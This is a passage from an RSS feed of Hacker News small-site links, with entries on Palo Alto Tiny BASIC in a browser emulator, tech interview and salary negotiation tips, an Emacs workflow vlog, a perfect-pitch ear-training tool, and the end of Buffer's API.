		<p aria-disabled="true">resynth1943.article</p>
	</div></div>]]>
            </description>
            <link>https://resynth1943.net/articles/youtube-dl-takedown/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873805</guid>
            <pubDate>Fri, 23 Oct 2020 20:35:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Palo Alto Tiny BASIC in the Browser]]>
            </title>
            <description>
<![CDATA[
Score 76 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24873472">thread link</a>) | @tosh
<br/>
October 23, 2020 | http://troypress.com/palo-alto-tiny-basic-in-your-browser/ | <a href="https://web.archive.org/web/*/http://troypress.com/palo-alto-tiny-basic-in-your-browser/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
				




<p><a href="https://maly.cz/">Martin Malý</a> has adapted Version 2 of Li Chen Wang’s <a href="https://en.wikipedia.org/wiki/Tiny_BASIC#Palo_Alto_Tiny_BASIC">Palo Alto Tiny BASIC</a> to run on his <a href="https://www.asm80.com/">ASM80</a> browser-based assembler and emulator. I’ve uploaded <a href="https://github.com/Geddd/PATB4ASM80">the source code</a>, with his permission, to GitHub.</p>



<p><strong>Background</strong></p>



<p>Palo Alto Tiny BASIC emerged out of the Tiny BASIC movement started by People’s Computer Company and taken up by the Homebrew Computer Club. Fellow members Steve Wozniak and Tom Pittman would develop their own BASICs (Integer BASIC and 6800 Tiny BASIC respectively). Wang analyzed the Altair BASIC code and contributed edits to Tiny BASIC Extended. Wang published in the newsletter a loader for the 8080, commenting on the <em>Open Letter to Hobbyists:</em></p>



<blockquote><p>Altair Basic has a bootstrap loader of twenty or twenty one bytes long. In principle, you can use this bootstrap to load in your own loader which will then load in your program. However, since Mr. Bill Gates claims that he did not yet payed [sic] enough and is in the mood of calling people thieves. (See HBCC newsletter ’12-1.) I decided to code one myself. What comes out is a bootstrap of sixteen bytes long. This is still too long, maybe our professional experts can make it shorter. For the time being you are welcome to copy mine and I will not call you a thief (this includes Mr. Gates).</p></blockquote>



<p>No surprise then that Li Chen Wang made his BASIC implementation available for free. (I found this quote reading old Homebrew newsletter articles in my research for the <a href="http://troypress.com/basic-interpreters-new-wikipedia-article/" data-type="post" data-id="853">BASIC interpreter article</a>.)</p>



<p>The only smaller implementation of Tiny BASIC was <a href="http://troypress.com/the-dialects-of-tiny-basic/" data-type="post" data-id="878">MINOL</a>, which used unsigned bytes instead of signed integers and which used nonstandard commands. Also weighing in under 2kB, when a common method of shipping interpreters was 4kB ROMs, Palo Alto Tiny BASIC supported a more typical version of the language while leaving extensive room for customization for specific hardware, something which was taken advantage of multiple times, for the TRS-80, the <a href="http://troypress.com/astro-basic/" data-type="post" data-id="867">Bally Astrocade</a>, the Sharp PC-1211, and the Cromemco.</p>



<p><strong>The Code</strong></p>



<p>It’s been fun to play with the source code that was behind three of the computers I used as a kid. Some things I learnt:</p>



<ul><li>The code is very well structured and extensible. I added a few commands in under an hour (<em>PEEK, FRE()</em>). All you need to do is insert new commands in the keyword table, then adapt code elsewhere.</li><li>I was very excited to find a few small bugs in the code:<ul><li>The system famously had only three error messages (“WHAT?” for syntax errors, “HOW?” for functional errors, and “SORRY” for capacity issues). If you execute a <em>RETURN</em> with no corresponding <em>GOSUB</em> you get a &nbsp;“WHAT?” instead of a “HOW?”</li></ul><ul><li><em>10 INPUT “HELLO WORLD” </em>acts like a valid <em>PRINT</em> statement when it should cause a syntax error, since no variable is specified to receive the input.</li></ul><ul><li>The language only supports integers, but decimals aren’t ignored as they should be. <em>PRINT 1.1, 1.2</em> outputs <em>1</em> and <em>0</em>.</li></ul></li><li>There’s an Easter egg! “W”, “AN”, “G”</li></ul>



<figure><img data-attachment-id="904" data-permalink="http://troypress.com/palo-alto-tiny-basic-in-your-browser/image-5/" data-orig-file="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?fit=379%2C329" data-orig-size="379,329" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-medium-file="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?fit=300%2C260" data-large-file="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?fit=379%2C329" loading="lazy" width="379" height="329" src="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?resize=379%2C329" alt="" srcset="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?w=379 379w, https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?resize=300%2C260 300w" sizes="(max-width: 379px) 100vw, 379px" data-recalc-dims="1"></figure>



<p><strong>RST 1 Routine</strong></p>



<p>The RST 1 routine is a work of art, using the call stack to determine where its parameters are, with the byte after RST 1 specifying the character to match and the byte after that specifying the offset to jump to. Wang’s ability to write such memory-efficient code is why he didn’t need to implement the <a href="http://troypress.com/the-tiny-basic-interpretive-language-il-and-onions/" data-type="post" data-id="249">IL virtual machine</a>.</p>



<figure><img data-attachment-id="905" data-permalink="http://troypress.com/palo-alto-tiny-basic-in-your-browser/image-1-2/" data-orig-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?fit=407%2C60" data-orig-size="407,60" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-1" data-image-description="" data-medium-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?fit=300%2C44" data-large-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?fit=407%2C60" loading="lazy" width="407" height="60" src="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?resize=407%2C60" alt="" srcset="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?w=407 407w, https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?resize=300%2C44 300w" sizes="(max-width: 407px) 100vw, 407px" data-recalc-dims="1"></figure>



<figure><img data-attachment-id="906" data-permalink="http://troypress.com/palo-alto-tiny-basic-in-your-browser/image-2-2/" data-orig-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?fit=468%2C203" data-orig-size="468,203" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?fit=300%2C130" data-large-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?fit=468%2C203" loading="lazy" width="468" height="203" src="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?resize=468%2C203" alt="" srcset="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?w=468 468w, https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?resize=300%2C130 300w" sizes="(max-width: 468px) 100vw, 468px" data-recalc-dims="1"></figure>



<p>I encourage you to check out the <a href="https://github.com/Geddd/PATB4ASM80">source code</a> for yourself.</p>

		
		</div></div>]]>
            </description>
            <link>http://troypress.com/palo-alto-tiny-basic-in-your-browser/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873472</guid>
            <pubDate>Fri, 23 Oct 2020 20:09:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Win Interviews and Influence Offers]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24873206">thread link</a>) | @vimota
<br/>
October 23, 2020 | https://vimota.me/writing/interviews | <a href="https://web.archive.org/web/*/https://vimota.me/writing/interviews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p><em>Disclaimers: Everyone's situation is different, this is just advice from mine and my friends' experience going through the interview and negotiation process. I don't necessarily agree with the current state of technical interviewing, but this piece presumes the status quo - though there are much <a href="https://medium.com/helpful-com/https-medium-com-fnthawar-helpful-technical-interviews-are-garbage-dc5d9aee5acd">better</a> <a href="https://medium.com/@racheltho/how-to-make-tech-interviews-a-little-less-awful-c29f35431987">interviewing</a> <a href="https://about.gitlab.com/blog/2020/03/19/the-trouble-with-technical-interviews/">methods</a>. I'm no expert, there are plenty of those who you should listen to.</em></p>
<blockquote>
<p>Tldr;</p>
<ul>
<li>READ <a href="https://twitter.com/patio11">@patio11</a>'s classic <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">Salary Negotiation post</a>. Every one should read it and then re-read it. This covers bits of it, but assumes the reader has already gone through it, so this focuses more on tactical techniques.</li>
<li>The best leverage is another offer (always have a good <a href="https://en.wikipedia.org/wiki/Best_alternative_to_a_negotiated_agreement">BATNA</a>), or a well positioned starting place.</li>
<li>The best way to get good offers is to do well on the interviews:<ul>
<li>practice a lot, mostly for the things you'll be tested on<ul>
<li>for most engineers this means coding questions, system design questions, (sometimes) debugging code, and project review.</li>
</ul></li>
</ul></li>
<li>It's a numbers game and timing matters quite a lot.</li>
<li>Practice negotiating, all the usual tips:<ul>
<li>Don't mention numbers, get them to give you an offer (you can nudge them that you're expecting "competitive" offers given the other companies you're interviewing at)</li>
<li>Don't haggle or go back and forth too many times. Ideally you get all the initial offers, then progressively use them against each other 1-2 times at most.</li>
<li>Figure out which levers matter to you the most (equity? location? level?) and when they don't have freedom to adjust in one, try another. Be willing to give in one dimension that matters less to you in order to take in another that matters more.</li>
</ul></li>
</ul>
</blockquote>
<p>Having recently gone through the tech interview loop, and discussing it with half a dozen friends who did the same, I realized how much private knowledge there was around optimizing the whole process. The unfortunate truth is that a lot of this information can make a <code>$10k-100k+</code> difference in salary for otherwise the same engineer. Some of it is common sense, but a lot of it is learned through word of mouth or collecting various sources online. So I wanted to level the playing field and put it all in one place in the hopes this helps a few folks who perhaps have less access to this information.</p>
<p>A little bit about myself: throughout my (6) internship experiences at the University of Waterloo I went through many dozens of interviews. It served as preparation for new grad interviews where I got several offers including Shopify and Google (where I eventually signed). After four years at Google I decided to go through the process again, and eventually received four offers at all the places I had onsites with: Square, CloudKitchens, Robinhood and Stripe. I even consulted with a <a href="https://fearlesssalarynegotiation.com/coach/">negotiation coach</a> (highly recommend him if you're not excited about the prospect of doing this yourself) and was told I had done everything I could have to get the best offer. I'm by no means an expert in this whole thing, but I've gotten to see a lot about how it works and had fun trying to pick it apart, while also learning a lot from others doing the same.</p>
<p>This guide is targeted at those who already have engineering experience, or perhaps are just going through their first round of interviews, but not those still learning computer science - for that there are plenty of other <a href="https://twitter.com/RandallKanna/status/1285630730610053123?s=20">great sources</a>. Otherwise, I'm assuming that you've decided to look around for an opportunity and want to do it in the most effective way possible. I hope this guide is as tactical as possible, so I'll keep things brief and actionable.</p>

<p>In the ideal case (and I'm not quite there either, but want to be more deliberate about it) you'll naturally have made friends and acquaintances throughout the industry that will think of you when they need to hire someone. A lot of times, these sorts of referrals will bypass parts or all of the standard interview process. Even if this is the case, unless you have a really good sense of the job market and the offer ranges for your experience level, <strong>I still recommend doing a couple of other interviews before taking such an offer</strong> so you can be confident it's competitive.</p>
<p>Most people, especially starting out, will have to seek out their own opportunities and that's fine! <strong>Define a criteria</strong> for yourself of things that interest you, locations you'd be willing to relocate to (remote?), and values you care about in a company. Don't necessarily restrict yourself to these for applying since you want to <strong>cast your net as wide as possible in the beginning</strong>, but keep your criteria in mind as you get closer to making your decision. Be sure to apply to companies that you know give out very high offers, even if you're not thrilled about working there because you may be able to use their offers as leverage.</p>
<p>It might be helpful to create an <code>Inteview Tracker</code>. I used a <a href="https://www.notion.so/vimota/adc4e53c94ea4f7a92e7af271d9d6d94?v=830efb1379904a6bad53cbf6d7e453a5">Notion Kanban board</a> to keep track of the different stages I was in for each company.
<img src="https://i.imgur.com/rqz9t7M.png"></p>
<p>Once you've applied to all the companies on your list, try to reach out to people in those companies to get 1) information about the interview process and the company culture and 2) potentially fast tracked through it. If you know someone at one of these companies, reach out to them! Even if you don't, pass around a list of companies you're interested in to people you know working in tech, there's a good chance they know someone who does. Cold reach outs work too, Jake does a great job of covering how to do this in his post <a href="https://justjake.substack.com/p/a-hackers-guide-to-job-hunting">A Hacker's Guide to Job Hunting</a>, I can't recommend this approach enough. Twitter is another great place to cold reach out to people at companies you're especially interested in. Most companies will have a modified process for referrals, and there's lots you can learn about a company's internal process for evaluating candidates that will help your chances, so this step can really help.</p>

<p>The best way to get great offers is to do well on the interviews. Your performance on the interviews is more than just pass/fail. Going above expectations on them gives you and the recruiter ammunition to push on the higher end of their allowed band, so try to really invest in practicing deliberately.</p>
<p>The format of the interview should be pretty familiar to you, 90% of companies follow something like this: Phone screen (coding question) -&gt; Onsite (2-3 coding questions, 1 system design, 1 project review). Sometimes they'll have a do-on-your-own-time project based interview instead, with a shorter 1-2 hour onsite. Lots has been written on how to practice for these already so I'll just link to some of the <a href="https://twitter.com/RandallKanna/status/1285630729850953729">best resources</a> and describe my general approach. 4-6 weeks of a couple of hours after work and on weekends should be more than enough time to prepare for the phone screens and onsites.</p>
<p>If you're intimidated by the open endedness of practicing for coding questions, I recommend starting by following a guide like <a href="https://yangshun.github.io/tech-interview-handbook/best-practice-questions/">this one</a>. You don't need to do every question for every week, and the dynamic programming week could be just skimmed through (in practice these are rarely asked), but it serves as a good path to make sure you cover most types of questions and continue making progress. On top of that it's useful to spend a couple sessions on:</p>
<ul>
<li><strong>algorithms and data structures</strong>; their trade offs and use cases and time complexity. <a href="https://www.interviewcake.com/data-structures-reference">These</a> are good <a href="https://github.com/kdn251/interviews">starting points</a>.</li>
<li><strong>object oriented programming and patterns</strong></li>
<li><strong>locks, parallelism and multi-threading</strong>. It's rare to get these in coding questions, but you should have some sense of what they are and how they're used. They sometimes come up when discussing follow ups to questions or in system design interviews. I mostly just reviewed the concepts with <a href="https://www.justsoftwaresolutions.co.uk/threading/locks-mutexes-semaphores.html">this</a> post, and made sure I knew how it was done in my programming language of choice, Python.</li>
<li>quirks about your <strong>programming language</strong> of choice. This probably isn't a deal breaker, but being able to drop some niche knowledge about the programming language you're using when it comes up in an interview makes you look like you really know your stuff. For example, I make sure to mention Python's Global Interpreter Lock (GIL) when talking about parallelism. <a href="https://www.notion.so/vimota/Python-Notes-7caf363f246f40ef9095e4ee13d6bcc0">Here</a> are some notes about things particular to Python I took along my practice. This is part of the reason I choose to interview with Python, it tends to have fewer things that "experts" are expected to know (compared to say, Java, where there are a million best practices), ie. fewer gotchas.</li>
</ul>
<p>The system design questions are a whole other beast, and deserve their own practice. You may not encounter them depending on the type of role you're interviewing for, but they're common for <code>full stack</code> and <code>backend</code>. They can be intimidating at first because they tend to be so open ended and have no "right answer", but once you've gone over a few examples you'll get familiar with the template you use to answer them.</p>
<ul>
<li>Go through <a href="https://github.com/donnemartin/system-design-primer">a primer</a>, taking notes on the different components that are used. Take note of the different failure modes that each part of the system can have and solutions to them (ie. retries, redundancy, timeouts, throttling, etc).</li>
<li>Impress the interviewer by naming actual services that represent each of the abstract components you're using (ie. Load balancer -&gt; NGINX, HAProxy, ELB ; cache -&gt; redis, memcache) and mention the differences between them or whether you've ever used them. This shows you have real world experience.</li>
<li>Practice answering some! Read through some <a href="https://www.educative.io/courses/grokking-the-system-design-interview/m2yDVZnQ8lG">examples</a> to learn how to structure you answers. Youtube is a solid resource for this.</li>
<li>Consistent hashing, concurrency models, partitioning, and caching are all important topics to understand.</li>
</ul>
<p>The bulk of questions you get will be covered by these, but there's a long tail of styles of questions you could also get: refactoring, debugging an open source project, designing an API, extending an existing class. It doesn't make sense to optimize for these, but know that they exist and try to get some "real world" practice as well beyond just Leetcode questions.</p>

<p>Timing matters. Try to schedule your interviews in a way that increases the chances you'll do well on the …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vimota.me/writing/interviews">https://vimota.me/writing/interviews</a></em></p>]]>
            </description>
            <link>https://vimota.me/writing/interviews</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873206</guid>
            <pubDate>Fri, 23 Oct 2020 19:50:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Emacs is “my favourite Emacs package”]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24872927">thread link</a>) | @datnoblesavage
<br/>
October 23, 2020 | https://protesilaos.com/codelog/2020-10-21-emacs-favourite-package/ | <a href="https://web.archive.org/web/*/https://protesilaos.com/codelog/2020-10-21-emacs-favourite-package/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" aria-label="Content">
            <div>
                <article>

	<div>

		

		<div>

			

			<p>In this video blog I talk about the persistent question of “the killer
app” that gets asked in the Emacs community.  I explain why I think the
identification of a single package is often not enough to appreciate the
true value proposition of Emacs.  My case emphasises the importance of
workflows; workflows that typically combine lots of distinct tools and
benefit from core Emacs attributes.  It is the whole system that
matters, because all those packages—in their given combinations—make
up our day-to-day computing experience with Emacs.</p>

<p>The text of the presentation is written in <code>org-mode</code> notation and is
reproduced below.  Also check my Emacs configuration file, from where
you can get the code I use: <a href="https://protesilaos.com/dotemacs">https://protesilaos.com/dotemacs</a>.</p>

<hr>

<pre><code>#+TITLE: Vlog: Emacs is my “favourite Emacs package”
#+AUTHOR: Protesilaos Stavrou · protesilaos.com

* Getting into the Emacs mindset

I will to talk to you about my approach to a recurring topic in the
Emacs community, best encapsulated in this question:

/What is your favourite package?/

Similar formulations:

+ What is the one thing that makes Emacs indispensable to you?
+ Which is Emacs' killer app?

Such questions can lead us to valuable findings.  There is truth to be
had in the insights drawn from them and we must learn as much as we can
in the process.

Note though that this type of inquiry expects from us to engage in an
analytical exercise that extracts an object from its milieu.  It puts us
in a frame of mind that can miss the true value proposition of Emacs.

The problématique comes with the latent risk of holding us captive to a
frame of mind characterised by *decontextualisation*, of examining an
object without reference to the environment that renders it possible.

Instead of thinking about workflows that can take you from one context
to another, we are expected to identify some silo of functionalities.
Are we then underestimating everything else that contributes to our
day-to-day /experience/ with Emacs?

* Don't ignore the forest while looking at the tree

Now before I get misunderstood: yes, Org and Magit are great; yes, there
are lots of individual packages that make your life easier; and yes,
there is value in finding which package[s] people enjoy the most.

What about the combination of all utilities?  What about the *gestalt*?

If you claim that “my favourite package is X” and then fail to couch
your statement in terms of the rest of the toolkit you rely on, you are
likely to underappreciate---or altogether ignore---the true value
proposition of Emacs.

You do not acknowledge how the whole system is pieced together.  More
importantly, you may not realise the potential of Emacs' extensibility,
which is dynamic or case-dependent.

In other words, Emacs provides the means to implement a metaphor like
that of the vaunted Unix pipes across its entire space.  In practical
terms, you can connect your email client to your agenda, your RSS reader
to your custom note-taking system, your music manager to your directory
editor, and so on.  And all these can benefit from interfaces for
searching, editing in bulk, etc.

My claim here is that most of the times there is no one package or
narrow subset that make Emacs great.  It rather is the linkages between
several pieces of code that make Emacs a pleasure to work with.  They
contribute to predictable-yet-flexible workflows.  These keep Emacs
relevant and, dare I say, intriguing.

* The three core attributes of Emacs

Emacs is programmable and introspectable.  Both presuppose transparency.
These make the Emacs experience open-ended.

+ Programmable :: One set of features can be made to interface with
  another, even though it was not conceived with the express purpose of
  optimising for that particular scenario.  What can be done with Emacs
  is not predetermined.  There is always scope for something new.

+ Introspectable :: The user can examine the entire code base or a
  specific implementation and, potentially, figure out how to connect to
  it through some other tool.  This is further supported by the robust
  self-documentation facilities of Emacs, as well as the high quality of
  material that is readily available through the built-in Info reader.
  Introspection has contributed to the /documentation culture/ that
  characterises the Emacs community at-large.

+ Transparent :: Emacs does not conceal its internals.  Virtually every
  case can be handled using the same language the code is written in
  (Emacs Lisp) while benefiting from live evaluation of new code.  You
  change something and you see it in action.  Combined with the
  self-documenting nature of Emacs, transparency provides insight into
  practically every single construct that makes up Elisp.  Which
  empowers us to make best use of Emacs' programmability.

When considered together, these engender the *interconnectedness* that
defines the Emacs space.
* Introspection in action

Quick demo of running =C-h o= (=describe-symbol=) over =mapcar= and =mapconcat=
and then testing those expressions.

#+begin_src emacs-lisp
(mapcar #'upcase '("one" "two" "three"))

(mapconcat #'upcase '("one" "two" "three") "-")
#+end_src

We can use =C-x C-e= (=eval-last-sexp=) to get live feedback of what each
function does.

We can check the log with =C-h e= (=view-echo-area-messages=).

These are the rudimentary tools you rely on to start using ELisp.  They
offer you the means to experiment with how to extend Emacs.
* A quick look at combining tools

Now let me switch to another window layout, where I have some plain text
files in a standard directory.  Nothing fancy here.  Just to show how
standard Emacs tools can combine together to deliver a consistent
computing experience.

+ Switching to another layout involves the built-in tabs (=tab-bar-mode=)
  plus some bespoke code of mine.
+ Find file at point using a filename or just part of a file (=C-x C-f M-n=).
+ Use a completion framework (=icomplete-mode= in my case).
+ Benefit from a pattern-matching style (=orderless= for me).
+ Jump to the directory that contains the file (=dired-jump=).
+ While in Dired, jump to an item using completion (=dired-goto-file=).
+ Or filter the Dired list and then find the item (=% m= potentially
  followed by =t k=).

* Interconnectedness in the Emacs space

My point is to highlight the true value of Emacs' extensibility.  Which
is realised in the connections you make between several pieces of
functionality.

And, as I already mentioned, one package does not need to know about the
presence of another /in advance/.

Your focus should be on the workflow.  On the whole system that helps
you get things done with Emacs.  Because that is what your actual
experience is about.  You benefit from the set of /emergent qualities/
that become available in the combination of otherwise disparate pieces
of functionality.

Let me stress the importance of interconnectedness in the Emacs space by
showing you another quick demo that combines three distinct packages
that were not developed for the express purpose of being combined
together:

+ =elfeed= for reading RSS/Atom feeds.
+ =bongo= for managing media files or links.
+ And my own experimental note-taking system (=usls=).

Finally, this entire presentation is made possible by combining several
tools:

+ =org-mode=
+ =olivetti-mode=
+ =org-tree-slide-mode=
+ =variable-pitch-mode=
+ my own commands for setting fonts
</code></pre>

		</div>

	</div>

</article>



            </div>
        </div></div>]]>
            </description>
            <link>https://protesilaos.com/codelog/2020-10-21-emacs-favourite-package/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24872927</guid>
            <pubDate>Fri, 23 Oct 2020 19:28:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Perfect Pitch Ear Training]]>
            </title>
            <description>
<![CDATA[
Score 142 | Comments 124 (<a href="https://news.ycombinator.com/item?id=24872754">thread link</a>) | @sergeykish
<br/>
October 23, 2020 | http://sergeykish.com/perfect-pitch-ear-training | <a href="https://web.archive.org/web/*/http://sergeykish.com/perfect-pitch-ear-training">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>I do not perceive notes in different octaves as same, this makes <a href="https://tonedear.com/ear-training/absolute-perfect-pitch-test">Toned Ear pitch training</a> guesswork. So I've created a tool where one can select individual notes:<br></p><table id="available"><tbody><tr><th>Bâ™¯/C</th><td><label for="C3">3</label></td><td><label for="C4">4</label></td><td><label for="C5">5</label></td></tr><tr><th>Câ™¯/Dâ™­</th><td><label for="C#3">3</label></td><td><label for="C#4">4</label></td><td><label for="C#5">5</label></td></tr><tr><th>D</th><td><label for="D3">3</label></td><td><label for="D4">4</label></td><td><label for="D5">5</label></td></tr><tr><th>Dâ™¯/Eâ™­</th><td><label for="D#3">3</label></td><td><label for="D#4">4</label></td><td><label for="D#5">5</label></td></tr><tr><th>E/Fâ™­</th><td><label for="E3">3</label></td><td><label for="E4">4</label></td><td><label for="E5">5</label></td></tr><tr><th>F</th><td><label for="F3">3</label></td><td><label for="F4">4</label></td><td><label for="F5">5</label></td></tr><tr><th>Fâ™¯/Gâ™­</th><td><label for="F#3">3</label></td><td><label for="F#4">4</label></td><td><label for="F#5">5</label></td></tr><tr><th>G</th><td><label for="G3">3</label></td><td><label for="G4">4</label></td><td><label for="G5">5</label></td></tr><tr><th>Gâ™¯/Aâ™­</th><td><label for="G#3">3</label></td><td><label for="G#4">4</label></td><td><label for="G#5">5</label></td></tr><tr><th>A</th><td><label for="A3">3</label></td><td><label for="A4">4</label></td><td><label for="A5">5</label></td></tr><tr><th>Aâ™¯/Bâ™­</th><td><label for="A#3">3</label></td><td><label for="A#4">4</label></td><td><label for="A#5">5</label></td></tr><tr><th>B/Câ™­</th><td><label for="B3">3</label></td><td><label for="B4">4</label></td><td><label for="B5">5</label></td>
</tr></tbody></table><p>Now run , it randomly selects note and plays it. Select answer <span id="answers">, , , , , , , , , , , </span>, if wrong it plays note second time so you can make another try. Or you can  selected note again.</p><p>Correct answer increases counter <span id="counterLabel">0</span>, incorrect resets it to zero. Buttons has keyboard shortcuts, corresponding key marked by underline. For example type <span>t</span> to run "<u>T</u>est",  <span>c</span> to answer "<u>C</u>", <kbd>Shift</kbd><span>+</span><kbd>c</kbd> for "<u>Câ™¯</u>" and <kbd>Alt</kbd><span>+</span><kbd>c</kbd> for "<u>Câ™­</u>" (not sure how it would work in Safari).</p><p>I think the way to go is making strong connections between sound and its name. Knowing not guessing. I've started with just two notes â€” G3 and C4. I close my eyes and go through hundreds of tests. Once I felt confident I've added G4, than C5.</p><p>TODO:</p><ul><li>store configuration in URL hash<br></li><li>select instrument</li><li>store instruments on server</li></ul><p>UPDATES:</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioContext">window.webkitAudioContext</a> for Safari</li><li>buttons to answer sharps and flats</li><li>mark incorrect answer with color</li><li><code>accesskey</code> replaced by <code>document.onkeydown</code></li></ul><p>Implementation:</p> </div>]]>
            </description>
            <link>http://sergeykish.com/perfect-pitch-ear-training</link>
            <guid isPermaLink="false">hacker-news-small-sites-24872754</guid>
            <pubDate>Fri, 23 Oct 2020 19:08:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The 'education bubble' is not merely a financial crisis; it is a moral crisis]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 20 (<a href="https://news.ycombinator.com/item?id=24872331">thread link</a>) | @lawschool333
<br/>
October 23, 2020 | https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88 | <a href="https://web.archive.org/web/*/https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88</link>
            <guid isPermaLink="false">hacker-news-small-sites-24872331</guid>
            <pubDate>Fri, 23 Oct 2020 18:25:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Happened to Buffer's API?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24872153">thread link</a>) | @gbourne
<br/>
October 23, 2020 | https://www.ayrshare.com/what-happened-to-buffers-api/ | <a href="https://web.archive.org/web/*/https://www.ayrshare.com/what-happened-to-buffers-api/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-node="5f340663d99e7">
	<div>
		
<h2>Buffer’s API is no more.</h2>



<p>I was an avid user of Buffer. For several companies I worked at or founded, I used Buffer to manually schedule my social media posts. Every day I would start my morning with researching post content material, writing a few posts, and scheduling these post to go out later in the day. </p>



<p>However, I quickly slowed down with creating these manual posts; I became distracted with other priorities as my company grew, or it was just laziness to think of new posts every day. Regardless, my social media engagement decreased as I posted less, which sucked.</p>



<figure><blockquote><p>Social media is an extension of your company identity in a way that is personal to your community.</p></blockquote></figure>



<p>Every founder and consumer-facing business leader knows how important social media is to growing a brand. Social media is an extension of your company identity in a way that is personal to your community. In a way that no other medium allows, my social media accounts allows me to connect to users in a real or perceived dialogue that is so essential for brand and reputation building.</p>



<p>As with most things in life, if it’s worth doing, it takes real effort.</p>



<p>Then I read an article, which I’m still hunting for, that was a slap your head “of course” moment: <strong>you can automate your organic social media</strong>. Instead of having to manually post every day I could take my existing content and post from my server-side, automating the entire process. I had tons of great data that could be automatically posted. All I needed was an API I could send my post through.</p>



<p>I went back to Buffer to use their API and bam!</p>



<figure><img loading="lazy" width="1024" height="284" src="https://ayrshare.positorgroup.com/wp-content/uploads/2020/10/Buffer-API-1024x284.jpg" alt="" srcset="https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-1024x284.jpg 1024w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-300x83.jpg 300w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-768x213.jpg 768w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API.jpg 1394w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The Message: Go Away</figcaption></figure>



<p>WTF!</p>



